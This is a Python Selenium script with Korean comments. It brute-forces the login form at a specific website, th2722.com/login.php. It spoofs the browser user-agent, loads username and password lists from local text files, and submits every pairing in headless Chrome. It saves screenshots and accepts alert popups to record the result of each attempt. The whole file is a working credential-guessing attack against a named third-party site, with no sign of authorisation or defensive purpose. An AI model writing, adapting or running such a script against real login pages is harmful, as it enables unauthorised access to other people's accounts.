from selenium import webdriver
import time
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from PIL import ImageGrab



options = webdriver.ChromeOptions()
options.add_argument('headless')
options.add_argument('window-size=1920x1080')
options.add_argument("disable-gpu")

# UserAgent값을 바꿔줍시다!
options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")

driver = webdriver.Chrome('C:\\Temp\\chromedriver.exe', chrome_options=options)

url = 'http://th2722.com/login.php'


# 3초 대기하기

driver.implicitly_wait(3)

# URL읽어들이기
driver.get(url)
# 캡쳐해서 저장하기


lists_id = []
lists_pw = []


#
f_id = open("C:\\Temp\\id.txt", 'r')
while True:
    line_id = f_id.readline()
    if not line_id: break
    # print(line_id)
    lists_id.append(line_id.rstrip().lstrip())
f_id.close()

f_pw = open("C:\\Temp\\pw.txt", 'r')
while True:
    line_pw = f_pw.readline()
    if not line_pw: break
    # print(line_pw)
    lists_pw.append(line_pw.rstrip().lstrip())
f_pw.close()


try:
    for list_id in lists_id:
        for list_pw in lists_pw:
            driver.find_element_by_xpath("//form[@id='login']/div/input").send_keys(list_id)

            print(list_id)
            driver.find_element_by_xpath("//form[@id='login']/div/input[2]").send_keys(list_pw)

            print(list_pw)

            time.sleep(2)
            driver.save_screenshot(list_id +"_"+list_pw+"_before.png")

            driver.find_element_by_xpath("//input[@type='image']").click()
            time.sleep(2)
            # driver.save_screenshot(list_id +"_"+list_pw+"_after.png")


            #경고창 발생 시 사용
            WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                            'Timed out waiting for PA creation ' +
                                            'confirmation popup to appear.')

            alert = driver.switch_to.alert
            print(alert.text)
            alert.accept()
            print("alert accepted")

            time.sleep(2)
            driver.save_screenshot(list_id +"_"+list_pw+"_after_alert.png")

except Exception as eLog:
    print(eLog)
    print(list_id +"," +list_pw)



# 종료하기

driver.quit()
